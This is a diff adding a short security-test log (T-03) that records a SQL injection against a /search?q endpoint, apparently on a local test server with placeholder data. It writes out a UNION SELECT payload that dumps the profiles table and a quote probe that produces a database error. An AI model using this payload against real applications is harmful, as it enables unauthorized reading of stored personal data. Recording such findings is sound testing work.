@@ -1,0 +1,13 @@
+=== T-03: SQL injection /search?q ===
+-- baseline q=BOB --
+[{"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]
+-- injection q=%' UNION SELECT id,name,email,address FROM profiles -- (dump all via UNION, closing LIKE) --
+[{"id": 99, "name": "INJECTED", "email": "sqli@proof", "address": "proof"}]
+-- quote only, to show syntax error / string concat --
+HTTP/1.0 500 Internal Server Error
+Server: BaseHTTP/0.6 Python/3.12.3
+Date: Thu, 29 Oct 2026 13:01:46 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 66
+
+{"error": "unrecognized token: \"'\"", "type": "OperationalError"}
